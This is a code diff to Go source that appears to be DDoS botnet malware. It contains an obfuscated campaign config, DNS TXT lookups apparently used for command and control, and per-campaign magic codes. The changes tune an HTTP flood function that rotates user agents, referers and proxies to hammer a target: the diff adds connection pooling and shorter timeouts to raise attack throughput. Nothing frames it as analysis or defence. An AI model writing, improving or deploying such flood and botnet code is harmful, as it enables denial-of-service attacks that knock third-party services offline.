@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "GTRv7pGOanCzINBEitc7sEayeLFSFTU1OsPZ86o=" //change me run setup.py
-const cryptSeed = "b60461b7"                                //change me run setup.py
+const gothTits = "Cr9d3wfOzl53zXSF4KkKxFe2n3Z5sQua3Em+q+Y=" //change me run setup.py
+const cryptSeed = "f3bd5974"                                //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -493,8 +493,8 @@ func dialga() string {
 }
 
 const (
-	magicCode       = "1a6R7s^W9DAYHc88" //change this per campaign
-	protocolVersion = "V1_8"             //change this per campaign
+	magicCode       = "WOnSk$sTaUlG*4FS" //change this per campaign
+	protocolVersion = "v2.2.2"             //change this per campaign
 )
 
 var (
@@ -1752,6 +1752,22 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)
 	userAgents := []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (Linux; Android 11; SM-G996B)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"}
 	referers := []string{"https://www.google.com/", "https://www.example.com/", "https://www.wikipedia.org/"}
+
+	// Create shared transport for non-proxy mode (connection pooling)
+	var sharedClient *http.Client
+	if !useProxy {
+		transport := &http.Transport{
+			MaxIdleConns:        1000,
+			MaxIdleConnsPerHost: 100,
+			IdleConnTimeout:     30 * time.Second,
+			DisableKeepAlives:   false,
+		}
+		sharedClient = &http.Client{
+			Timeout:   10 * time.Second,
+			Transport: transport,
+		}
+	}
+
 	for i := 0; i < cozyBear; i++ {
 		wg.Add(1)
 		go func() {
@@ -1761,15 +1777,15 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 				proxyAddr := persian()
 				if proxyAddr != "" {
 					var err error
-					client, err = meowstic(proxyAddr, 30*time.Second)
+					client, err = meowstic(proxyAddr, 10*time.Second)
 					if err != nil {
-						client = &http.Client{Timeout: 30 * time.Second}
+						client = &http.Client{Timeout: 10 * time.Second}
 					}
 				} else {
-					client = &http.Client{Timeout: 30 * time.Second}
+					client = &http.Client{Timeout: 10 * time.Second}
 				}
 			} else {
-				client = &http.Client{Timeout: 30 * time.Second}
+				client = sharedClient
 			}
 			for {
 				select {
@@ -1782,7 +1798,7 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 					if useProxy && rand.Intn(100) < 10 {
 						proxyAddr := persian()
 						if proxyAddr != "" {
-							newClient, err := meowstic(proxyAddr, 30*time.Second)
+							newClient, err := meowstic(proxyAddr, 10*time.Second)
 							if err == nil {
 								client = newClient
 							}
